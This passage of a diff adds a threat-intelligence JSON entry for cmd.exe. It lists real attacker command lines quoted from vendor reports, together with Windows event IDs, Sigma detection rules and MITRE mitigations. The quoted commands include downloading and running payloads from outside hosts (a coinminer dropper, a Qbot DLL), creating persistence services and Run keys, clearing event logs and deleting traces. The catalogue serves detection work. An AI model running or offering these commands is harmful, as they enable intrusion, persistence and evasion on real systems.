+        "command": "cmd.exe /c powershell.exe Invoke-WebRequest http://microsoftsoftwaredownload.com:8080/m103w.zip -OutFile C:\\windows\\temp\\dsf.exe & C:\\windows\\temp\\dsf.exe RS9+cn_0 & del C:\\windows\\temp\\dsf.exe",
+        "intent": "Some attackers used it to download, run and delete a coinminer dropper after exploiting Exchange.",
+        "status": "verified",
+        "source_name": "Rapid7 Exchange Post-Exploitation March 2021",
+        "source_url": "https://www.rapid7.com/blog/post/2021/03/23/defending-against-the-zero-day-analyzing-attacker-behavior-post-exploitation-of-microsoft-exchange/"
+      },
+      {
+        "command": "cmd.exe /Q /c c:\\temp\\1.bat 1> \\\\127.0.0.1\\ADMIN$\\_______._______ 2>&1",
+        "intent": "Run, likely through WMIExec, to execute the 1.bat script after the actor created the WebrootCheck service.",
+        "status": "verified",
+        "source_name": "Huntress Advanced Intrusion Marketing Research Company May 2025",
+        "source_url": "https://www.huntress.com/blog/advanced-intrusion-targeting-executive-at-critical-marketing-research-company"
+      },
+      {
+        "command": "cmd.exe /c del \\\\<target_host>\\c$\\users\\public\\<bat_name>.bat && del \\\\<target_host>\\c$\\users\\public\\ccf32.exe",
+        "intent": "Cleanup step after collection: removes the batch file and ccf32.exe from the target host.",
+        "status": "verified",
+        "source_name": "Bitdefender FunnyDream Campaign November 2020",
+        "source_url": "https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf"
+      },
+      {
+        "command": "sc create “Office Update” binpath= “cmd /c start /b C:\\ProgramData\\Microsoft\\NetFramework\\vssvb.exe” start= auto",
+        "intent": "Persistence for the deployed backdoor, installed by a batch file run through WMI.",
+        "status": "verified",
+        "source_name": "Bitdefender FunnyDream Campaign November 2020",
+        "source_url": "https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe /c “copy c:\\users\\public\\bin\\filepak.exe \\\\<remote host>\\c$\\users\\public\\ /Y”",
+        "intent": "Deploys the Filepak file collection component to a remote host.",
+        "status": "verified",
+        "source_name": "Bitdefender FunnyDream Campaign November 2020",
+        "source_url": "https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf"
+      },
+      {
+        "command": "/c cd /d c:\\windows\\temp & sc \\\\<IP ADDRESS> create win32times binPath= \"cmd /c start c:\\windows\\temp\\x.bat\"",
+        "intent": "On some occasions the actor created a remote service to execute a batch file, instead of its preferred scheduled tasks.",
+        "status": "verified",
+        "source_name": "Fox-IT Operation Wocao December 2019",
+        "source_url": "https://www.fox-it.com/media/kadlze5c/201912_report_operation_wocao.pdf"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe /C sqlceip.exe -default -f (name=”Organization Management”) member -list | sqlceip.exe -f objectcategory=* > .\\SettingSync\\log2.txt",
+        "intent": "Runs AdFind, renamed sqlceip.exe, to list Exchange Organization Management members and dump directory objects to a log file.",
+        "status": "verified",
+        "source_name": "Volexity Dark Halo SolarWinds December 2020",
+        "source_url": "https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe /C .\\7z.exe a -mx9 -r0 -p[33_char_password]  “C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Redir.png” C:\\Temp\\b.pst",
+        "intent": "Compresses and password-protects an exported mailbox PST into a PNG file in the OWA auth directory for download.",
+        "status": "verified",
+        "source_name": "Volexity Dark Halo SolarWinds December 2020",
+        "source_url": "https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/"
+      },
+      {
+        "command": "%windir%\\System32\\cmd.exe /c %windir%\\system32\\curl -s -o %temp%\\goAlso.rtf http[:]//146[.]70[.]79[.]52/fromMakeTell.dat&&%windir%\\system32\\regsvr32 %temp%\\goAlso.rtf",
+        "intent": "Run by the LNK file to download the Qbot DLL payload as goAlso.rtf and execute it with regsvr32.",
+        "status": "verified",
+        "source_name": "Deep Instinct Black Basta August 2022",
+        "source_url": "https://www.deepinstinct.com/blog/black-basta-ransomware-threat-emergence"
+      },
+      {
+        "command": "cmd.exe /c start /wait \"\" \"C:\\Users\\[removed]\\AppData\\Local\\Temp\\ATTACHME.LNK\"",
+        "intent": "Process tree from the ISO's shortcut file: it ran ATTACHME.LNK, which executed Attachments.dat to run the Bumblebee downloader.",
+        "status": "verified",
+        "source_name": "Proofpoint Bumblebee April 2022",
+        "source_url": "https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming"
+      },
+      {
+        "command": "cmd /c start regsvr32 /s /i ..\\\\<filename>  & start cmd /c \\\"ping localhost -n 7 & wevtutil cl System\\\"",
+        "intent": "HermeticWizard runs it over SMB on the target to load the dropped DLL, then clears the System event log after a delay.",
+        "status": "verified",
+        "source_name": "ESET IsaacWiper and HermeticWizard March 2022",
+        "source_url": "https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe /c sc create “”WBService”” type= own type= interact start= auto error= ignore binpath= “cmd.exe /k start C:\\U8fVCdX\\58fef66f346fe3ed320e22640ab997055e54c8704fc272392d71e367e2d1c2bb.exe”",
+        "intent": "Adds persistence for the dropper as a service called WBService.",
+        "status": "verified",
+        "source_name": "Cyberbit Dtrack Nuclear Power Plant November 2019",
+        "source_url": "https://www.cyberbit.com/blog/endpoint-security/dtrack-apt-malware-found-in-nuclear-power-plant/"
+      },
+      {
+        "command": "C:\\Windows\\System32\\cmd.exe /c wmic.exe /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed",
+        "intent": "One of the system discovery commands the LATRODECTUS collect-system-information handler runs to list installed antivirus products.",
+        "status": "verified",
+        "source_name": "Elastic Security Labs Latrodectus May 2024",
+        "source_url": "https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus"
+      },
+      {
+        "command": "c:\\windows\\system32\\cmd.exe /C reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Amdesk /t REG_SZ /d \"Rundll32.exe SHELL32.DLL,ShellExec_RunDLL \"C:\\Users\\Public\\Libraries\\active_desktop\\desktop_launcher.exe\"\" /f",
+        "intent": "The stager creates persistence across reboots through the registry Run key.",
+        "status": "verified",
+        "source_name": "Cisco Talos Mustang Panda Targets Europe May 2022",
+        "source_url": "https://blog.talosintelligence.com/mustang-panda-targets-europe/"
+      },
+      {
+        "command": "cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d \"\"i1=aaaa&EF1=2m.txt&WF1=test.pdf\"\" -X PO9ST hxxp://tnt200[.]mywire[.]org/Do1 -o %temp%\\2m.v9bs & call %c:9=% & set b=sta9rt \"\"\"\" \"\"%temp%\\2m.v9bs\"\" & call %b:9=%",
+        "intent": "The VBScript downloader runs it when Windows Defender is not running, to download a script with curl; the 9 characters are removed at run time to hide the strings.",
+        "status": "verified",
+        "source_name": "Mandiant Untangling Iran APT42 Operations May 2024",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/untangling-iran-apt42-operations"
+      },
+      {
+        "command": "C:\\WINDOWS\\system32\\cmd.exe /C copy C:\\users\\public\\fksro.xls \\\\<HOST>\\C$\\users\\public\\abcabc.xls",
+        "intent": "Copies a beacon file to other hosts over the C$ share during lateral movement.",
+        "status": "verified",
+        "source_name": "Trend Micro Black Basta Qakbot Brute Ratel October 2022",
+        "source_url": "https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html"
+      },
+      {
+        "command": "\"C:\\Windows\\system32\\cmd.exe\" /C systeminfo >> \"C:\\Ahnlab\\$$$A24F.TMP\"",
+        "intent": "NavRAT uses cmd.exe to run systeminfo and write the output to a TMP file in an AhnLab-named folder, appending with >>.",
+        "status": "verified",
+        "source_name": "Cisco Talos NavRAT May 2018",
+        "source_url": "https://blog.talosintelligence.com/2018/05/navrat.html"
+      },
+      {
+        "command": "cmd.exe /c del c:\\Windows\\system32\\UIAnimation.xml /f /q",
+        "intent": "After reconnaissance the attackers deleted the malware file to cover their traces.",
+        "status": "verified",
+        "source_name": "JPCERT/CC MirrorFace Attack July 2024",
+        "source_url": "https://blogs.jpcert.or.jp/en/2024/07/mirrorface-attack-against-japanese-organisations.html"
+      },
+      {
+        "command": "cmd.exe /c del /f \"\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies\"\"",
+        "intent": "Deletes the Chrome cookie file after the implants are in place to force users to reauthenticate.",
+        "status": "verified",
+        "source_name": "Cisco Talos Kimsuky Abuses Blogs November 2021",
+        "source_url": "https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html"
+      },
+      {
+        "command": "cmd.exe /c reg delete \"HKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Resiliency\" /F",
+        "intent": "Run by shellcode in the RTF exploit to disable Word's recovery features.",
+        "status": "verified",
+        "source_name": "Forcepoint Monsoon Analysis Report",
+        "source_url": "https://www.forcepoint.com/sites/default/files/resources/files/forcepoint-security-labs-monsoon-analysis-report.pdf"
+      },
+      {
+        "command": "cmd /c C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\ProgramData\\ctac.xml",
+        "intent": "Run through a backdoor command to execute the downloaded NOOPDOOR components.",
+        "status": "verified",
+        "source_name": "Trend Micro Earth Kasha Updates April 2025",
+        "source_url": "https://www.trendmicro.com/en_us/research/25/d/earth-kasha-updates-ttps.html"
+      }
+    ]
+  },
+  "detections": {
+    "eventsid": [
+      {
+        "log": "WinEventLog:PowerShell",
+        "event_id": 4103,
+        "data_components": "Command Execution",
+        "techniques": "T1082, T1070.004"
+      },
+      {
+        "log": "WinEventLog:PowerShell",
+        "event_id": 4104,
+        "data_components": "Command Execution",
+        "techniques": "T1082, T1070.004"
+      },
+      {
+        "log": "WinEventLog:PowerShell",
+        "event_id": 4105,
+        "data_components": "Command Execution",
+        "techniques": "T1082, T1070.004"
+      },
+      {
+        "log": "WinEventLog:PowerShell",
+        "event_id": 4106,
+        "data_components": "Command Execution",
+        "techniques": "T1082, T1070.004"
+      },
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4656,
+        "data_components": "File Access",
+        "techniques": "T1070.004"
+      },
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4663,
+        "data_components": "File Access",
+        "techniques": "T1070.004"
+      },
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4670,
+        "data_components": "File Access",
+        "techniques": "T1070.004"
+      },
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4688,
+        "data_components": "Process Creation",
+        "techniques": "T1059.003, T1082, T1083"
+      },
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 5140,
+        "data_components": "Network Share Access",
+        "techniques": "T1570"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 1,
+        "data_components": "Process Creation",
+        "techniques": "T1570, T1082, T1105"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 3,
+        "data_components": "Network Connection Creation",
+        "techniques": "T1105"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 7,
+        "data_components": "Module Load",
+        "techniques": "T1059.003"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 11,
+        "data_components": "File Creation",
+        "techniques": "T1570, T1105, T1083"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 13,
+        "data_components": "Windows Registry Key Modification",
+        "techniques": "T1082"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 14,
+        "data_components": "Windows Registry Key Modification",
+        "techniques": "T1082"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 22,
+        "data_components": "Network Connection Creation",
+        "techniques": "T1105"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 23,
+        "data_components": "File Deletion",
+        "techniques": "T1070.004"
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "Potential Pikabot Infection - Suspicious Command Combinations Via Cmd.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/Malware/Pikabot/proc_creation_win_malware_pikabot_combined_commands_execution.yml"
+      },
+      {
+        "title": "Ursnif Redirection Of Discovery Commands",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/Malware/Ursnif/proc_creation_win_malware_ursnif_cmd_redirection.yml"
+      },
+      {
+        "title": "CMD Shell Output Redirect",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_cmd_redirect.yml"
+      },
+      {
+        "title": "Potential File Override/Append Via SET Command",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_cmd_set_prompt_abuse.yml"
+      },
+      {
+        "title": "Remote Access Tool - Cmd.EXE Execution via AnyViewer",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_remote_access_tools_anyviewer_shell_exec.yml"
+      },
+      {
+        "title": "Change Default File Association Via Assoc",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_assoc_execution.yml"
+      },
+      {
+        "title": "Change Default File Association To Executable Via Assoc",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_assoc_tamper_exe_file_association.yml"
+      },
+      {
+        "title": "Copy .DMP/.DUMP Files From Remote Share Via Cmd.EXE",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_copy_dmp_from_share.yml"
+      },
+      {
+        "title": "File Deletion Via Del",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_del_execution.yml"
+      },
+      {
+        "title": "Greedy File Deletion Using Del",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_del_greedy_deletion.yml"
+      },
+      {
+        "title": "File And SubFolder Enumeration Via Dir Command",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_dir_execution.yml"
+      },
+      {
+        "title": "Command Line Execution with Suspicious URL and AppData Strings",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_http_appdata.yml"
+      },
+      {
+        "title": "Cmd Launched with Hidden Start Flags to Suspicious Targets",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_launched_with_hidden_start_flag.yml"
+      },
+      {
+        "title": "Potential Privilege Escalation Using Symlink Between Osk and Cmd",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_mklink_osk_cmd.yml"
+      },
+      {
+        "title": "Suspicious File Execution From Internet Hosted WebDav Share",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_net_use_and_exec_combo.yml"
+      },
+      {
+        "title": "Cmd.EXE Missing Space Characters Execution Anomaly",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_no_space_execution.yml"
+      },
+      {
+        "title": "Potential CommandLine Path Traversal Via Cmd.EXE",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_path_traversal.yml"
+      },
+      {
+        "title": "Potentially Suspicious Ping/Copy Command Combination",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_ping_copy_combined_execution.yml"
+      },
+      {
+        "title": "Potentially Suspicious CMD Shell Output Redirect",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_redirection_susp_folder.yml"
+      },
+      {
+        "title": "Directory Removal Via Rmdir",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_rmdir_execution.yml"
+      },
+      {
+        "title": "Read Contents From Stdin Via Cmd.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_stdin_redirect.yml"
+      },
+      {
+        "title": "Sticky Key Like Backdoor Execution",
+        "level": "critical",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_sticky_key_like_backdoor_execution.yml"
+      },
+      {
+        "title": "Persistence Via Sticky Key Backdoor",
+        "level": "critical",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_sticky_keys_replace.yml"
+      },
+      {
+        "title": "Unusual Parent Process For Cmd.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_unusual_parent.yml"
+      },
+      {
+        "title": "OpenEDR Spawning Command Shell",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_comodo_ssh_shellhost_cmd_spawn.yml"
+      },
+      {
+        "title": "Operator Bloopers Cobalt Strike Commands",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_hktl_cobaltstrike_bloopers_cmd.yml"
+      },
+      {
+        "title": "Always Install Elevated MSI Spawned Cmd And Powershell",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_elavated_msi_spawned_shell.yml"
+      }
+    ],
+    "related_sigma_rules": 158,
+    "other_rules": [
+      "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml",
+      "https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml"
+    ]
+  },
+  "related_CVE": [],
+  "mitigations": [
+    {
+      "id": "M1031",
+      "name": "Network Intrusion Prevention",
+      "technique": "T1570"
+    },
+    {
+      "id": "M1037",
+      "name": "Filter Network Traffic",
+      "technique": "T1570"
+    },
+    {
+      "id": "M1038",
+      "name": "Execution Prevention",
+      "technique": "T1059.003"
+    },
+    {
+      "id": "M1031",
+      "name": "Network Intrusion Prevention",
+      "technique": "T1105"
+    },
+    {
+      "id": "M1037",
+      "name": "Filter Network Traffic",
+      "technique": "T1105"
+    }
+  ],
+  "additional_mitigations": [],
+  "references": [
+    "https://attack.mitre.org/software/S0106",
+    "https://lolbas-project.github.io/lolbas/Binaries/Cmd/",
+    "https://strontic.github.io/xcyclopedia/library/cmd.exe-321A50053155122E6ACE9691197A8E3F.html"
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
+}
